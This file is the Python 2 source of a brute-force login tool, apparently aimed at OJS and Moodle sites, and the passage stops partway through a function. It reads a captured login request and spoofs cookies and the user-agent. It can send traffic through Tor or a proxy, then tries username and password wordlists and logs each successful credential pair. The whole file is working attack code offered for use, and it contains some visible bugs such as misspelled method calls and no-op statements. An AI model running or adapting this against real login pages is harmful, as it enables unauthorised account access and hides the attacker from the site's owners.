import re # Utilizado para regex
import sys
import time
import requests #Utilizado para realizar las peticiones
import os.path
from termcolor import colored
import socket # Tor
import socks # Tor
import random

def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,report,valUrl):
	
	b = ['','1','12']
	a = []
	proxy = proxip  + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	
	print colored("\nBeginning BruteForce with Request File", 'cyan')
	warning = raw_input('Please check that the arguments you gave to the tool are correct, Do you continue? [Y/n]') or 'Y'
	if 'Y' in warning or 'y' in warning:
		pass
	else:
		error = """
Advices to check the arguments:
 * Error message: To check the correct error message showed by the site, you could try the following after one login:
  - OJS: 
	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
	2.- Look for the form named "pkp_form_error" and inside the element, it would be the error message

  - Moodle:
	1.- Add at the beginning of the URL the tag "view-source" (without the quotes).
	2.- Look for any of these tags: "loginerror" or "loginerrormessage" and next to them it should be the error message
"""
		print colored(error,'green')
		sys.exit(2)
	
	if os.path.exists(reqFile):
		fo = open(reqFile,'r')
		for line in fo:
			regex = re.compile(r'Referer\: (.*)') # Obtiene el enlace del login
			match = regex.search(line)
			try:
				if match.group():
					url = match.group(1)
			except:
				pass
			if '&' in line:
				val = re.split(r'[&=]',line)
				userField = val[0]
				passField = val[2]
		fo.close()
	else:
		print colored('The file doesn\'t exists', 'green')
		sys.exit(2)
	
	if valUrl in url:
		pass
	else:
		print colored('The url: ','yellow') + colored(valUrl,'blue') + colored(' doesn\'t match with: ','yellow') + colored(url,'blue')
		
		sys.exit(2)
	
	
	print colored('Username field is: ','yellow') + colored(userField,'blue') + colored(' Password field is: ','yellow') + colored(passField,'blue')
	ask = raw_input('Are those values correct and Can we continue? [Y/n]') or 'Y'
	if 'Y' in ask or 'y' in ask:
		pass
	else:
		error = """
Advices to get the correct values in the file:
	* The tool takes only two values in the file, e.g.:
	
1.- If the fields are 'username' and 'password' and the sentence is: anchor=&username=jaja&password=nds
		Please modify the file like this: username=jaja&password=nds
	
2.- If the fields are 'username' and 'password' and the sentence is: csrfToken=e71f33efe15de9fdcee2631e003f0ea3&source=&username=asd&password=asd&remember=1
		Please modify like this: username=asd&password=asd&remember=1
 
"""
		print colored(error,'green')
		sys.exit(2)
		
		print colored()
		sys.exit(2)
		
	
	requests.packages.urllib3.disable_warnings()
	if len(proxy) == 1:
		if tor == True: # Peticiones a traves de Tor
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			try:
				req = requests.get(url,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.TimeoutError:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
		else:
			try:
				req = requests.get(url,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.TimeoutError:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
	else: # Peticiones a traves del proxy
		try:
			req = requests.get(url,proxies = proxies,verify=False)
		except requests.exceptions.ConnectionError:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.RequestException:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.exceptions.TimeoutError:
			print colored('Too many time waiting for response, please try again','green')
			sys.exit(2)
	
	if cookie is None: # Obtiene la cookie de sesion
		for key,value in req.headers.iteritems():
			if key.startswith('set-cookie'):
				previous = value.split(';')[0].split('=')
				cookies = {previous[0] : previous[1]}
			else:
				pass
		
		if cookie is None:
			alp = ['a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
			cook = []
			while len(cook) < 26:
				cook.append(random.choice(alp))
			c =  "".join(str(element) for element in cook)
			cookies = {'Random_Cookie' : c}

	
	else:
		jar = cookie.split(',')
		cookies = {jar[0]:jar[1]}
		
	if agent is None:
		agent = 'Mozilla/5.0 (PLAYSTATION 3;3.55)'
		headers = {'user-agent': agent}
	else:
		headers = {'user-agent': agent}
	
	
	requests.packages.urllib3.disable_warnings()	
	for element in b: # Se realizan las peticiones para validar que parametros regresa el sitio
		payload = {userField : element, passField: ''}
		if len(proxy) == 1:
			if tor == True:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
				socket.socket = socks.socksocket
				try:
					req = requests.post(url,payload, cookies = cookies, headers = headers,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.TimeoutError:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
			else:
				try:
					req = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.TimeoutError:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
		else:
			try:
				req = requests.post(url,cookies = cookies, headers = headers,proxies = proxies,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.TimeoutError:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
		a.append(len(req.content))
	
	if os.path.exists(user): #archivo con usuarios
		print colored('There\'s a file named: ','yellow') + colored(user,'blue') + colored(' as an user argument.','yellow')
		ask = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y'
		if 'Y' in ask or 'y' in ask:
			u = 1
		else:
			u = 0
	else:
		u = 0
	
	if os.path.exists(pwd):
		print colored('There\'s a file named: ','yellow') + colored(pwd,'blue') + colored(' as a password argument.','yellow')
		askp = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y'
		if 'Y' in askp or 'y' in askp:
			p = 1  
		else:
			p = 0
	else:
		p = 0
		
	if u == 1 and p == 1:
		doubleFile(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 1 and p == 0:
		usersFile(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 0 and p == 1:
		pwdFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	elif u == 0 and p == 0:
		single(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
	else:
		print colored('Sorry, something is wrong :(','green')
	
			


def single(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): # Sin archivos
	l = []
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
	
		
	payload = { userField : user, passField: pwd} # Carga del payload
	
	if len(proxy) == 1:
		if tor == True:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
			socket.socket = socks.socksocket
			try:
				r = requests.post(url,payload,cookies = cookies, headers = headers,verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.TimeoutError:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
		else:
			try:
				r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
			except requests.exceptions.ConnectionError:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.RequestException:
				print colored('It can\'t contact with the login page','green')
				sys.exit(2)
			except requests.exceptions.TimeoutError:
				print colored('Too many time waiting for response, please try again','green')
				sys.exit(2)
	else:
		try:
			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
		except requests.exceptions.ConnectionError:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.RequestException:
			print colored('It can\'t contact with the login page','green')
			sys.exit(2)
		except requests.exceptions.TimeoutError:
			print colored('Too many time waiting for response, please try again','green')
			sys.exit(2)
	
	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	
	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
		if int(len(r.content)) == list[0] and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			if int(verbose) == 1:
				print colored('Attack not successfully ', 'red')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int (verbose) == 2:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
				l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + pwd)
		else:
			if int(verbose) == 1:
				print colored('Successful attack ', 'green')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 2:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
			elif int(verbose) == 3:
				print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
				l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + pwd)
	rep(report,l)

def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report):
	users = []
	l = []
	requests.packages.urllib3.disable_warnings()		
	
	if os.path.exists(user): #archivo con usuarios
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
			if len(proxy) == 1:
				if tor == True:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket
					try:
						r = requests.post(url, data = payload, cookies = cookies, headers = headers,verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
				else:
					try:
						r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
			else:
				try:
					r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.TimeoutError:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
			
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	
	
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] or mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack with ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
						l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + pwd)
	rep(report,l)	

def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,headers,proxy,proxies,list, tor,report):
	
	passwords = []
	l = []
	requests.packages.urllib3.disable_warnings()		
	
	if os.path.exists(pwd): #archivo con usuarios
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')} # Carga del payload
			
			if len(proxy) == 1:
				if tor == True:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
					socket.socket = socks.socksocket 
					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
					try:
						r = requests.post(url,data = payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
				else:
					try:
						r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
			else:
				try:
					r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
				except requests.exceptions.ConnectionError:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.RequestException:
					print colored('It can\'t contact with the login page','green')
					sys.exit(2)
				except requests.exceptions.TimeoutError:
					print colored('Too many time waiting for response, please try again','green')
					sys.exit(2)
		
			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
			
			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
				if int(len(r.content)) == list[0] and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Attack not successfully  ', 'red')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int (verbose) == 2:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
						l.append('Attack not successfully with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
				else:
					if int(verbose) == 1:
						print colored('Successful attack ', 'green')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 2:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
					elif int(verbose) == 3:
						print colored('Successful attack with: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
						l.append('Successful attack with: ' + 'User: ' + user + ' Password: ' + passwords[i].rstrip('\n'))
	rep(report,l)

def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report):
	l = []
	users = []
	passwords = []
	i = 0
	j = 0
	requests.packages.urllib3.disable_warnings()		
	
	
	if os.path.exists(user) and os.path.exists(pwd): # ambos archivos
		
		fo = open(user, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwd, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				if len(proxy) == 1:
					if tor == True:
						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
						socket.socket = socks.socksocket
						proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
						try:
							r = requests.post(url,data = payload, cookies = cookies, headers = headers,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
						except requests.exceptions.ConnectionError:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.RequestException:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.exceptions.TimeoutError:
							print colored('Too many time waiting for response, please try again','green')
							sys.exit(2)
					else:
						try:
							r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
						except requests.exceptions.ConnectionError:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)
						except requests.RequestException:
							print colored('It can\'t contact with the login page','green')
							sys.exit(2)	
						except requests.exceptions.TimeoutError:
							print colored('Too many time waiting for response, please try again','green')
							sys.exit(2)
				else:
					try:
						r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
					except requests.exceptions.ConnectionError:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.RequestException:
						print colored('It can\'t contact with the login page','green')
						sys.exit(2)
					except requests.exceptions.TimeoutError:
						print colored('Too many time waiting for response, please try again','green')
						sys.exit(2)
					
				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							#l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
							l.append('Attack not successfully with: ' + 'User: ' + users[i] + ' Password: ' + passwords[j])
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
						
				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
					if int(len(r.content)) == list[0] and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Successful attack ', 'green')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 2:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int(verbose) == 3:
							print colored('Successful attack with: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
							l.append('Successful attack with: ' + 'User: ' + users[i].rstrip('\n') + ' Password: ' + passwords[j].rstrip('\n'))

						
						j + 1
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						if int(verbose) == 1:
							print colored('Attack not successfully  ', 'red')
							l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
						elif int (verbose) == 2:
							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
